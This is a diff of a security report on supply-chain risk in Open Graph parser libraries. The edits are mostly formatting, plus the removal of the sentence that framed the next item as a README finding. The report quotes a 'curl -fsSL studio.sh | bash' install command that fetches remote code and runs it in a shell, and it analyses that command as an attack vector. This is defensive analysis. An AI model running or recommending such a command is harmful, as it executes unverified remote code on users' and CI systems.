@@ -6,8 +6,10 @@ Modern software supply chains increasingly rely on metadata parsers to display r
 
 ### 2. Introduction & Problem Statement
 The Open Graph Protocol enables websites to act as rich objects in social and collaborative graphs. Through standardized <meta> tags in the <head> of a page (e.g., og:title, og:image), parsers extract structured data.
-The Inherent Risk
+
+- The Inherent Risk
 Since parsers must process external, untrusted HTML content, they constitute a critical interface. If the Node/PHP libraries used for processing are insufficiently isolated or contain manipulated installation routines, the parsing tool mutates into the primary entry point for supply chain attacks.
+
 The analysis of the ecosystem surrounding the components under qapdex-maker.github.io/opengraph-node/ shows a critical vulnerability in the deployment and installation phase:
 
 ### 3. Structure of the Investigation Folder
@@ -16,7 +18,8 @@ ogp-demo.html / ogp-params.html: Demo pages for validating OGP parameters.
 probe-response.html: Logging of parser reactions to manipulated payloads.
  3.1 Technical Case Study: opengraph-node & studio.sh
  3.2 The studio.sh Vector
-In the main directory of the repository, the following instruction was identified in the installation documentation (README.md):
+ 
+
 ```
 curl -fsSL studio.sh | bash
 ```
@@ -24,6 +27,7 @@ curl -fsSL studio.sh | bash
 
 Security analysis of this pattern
 Unencrypted/Unverified Execution: The direct piping of a remote resource into the shell (bash) bypasses local security policies.
+
 Dynamic Payload Generation: The server behind studio.sh can inject malicious code based on the User-Agent or IP address of the requesting system (e.g., a CI/CD pipeline), which remains undetected during static code analysis.
 
 ### 4. Threat Modeling
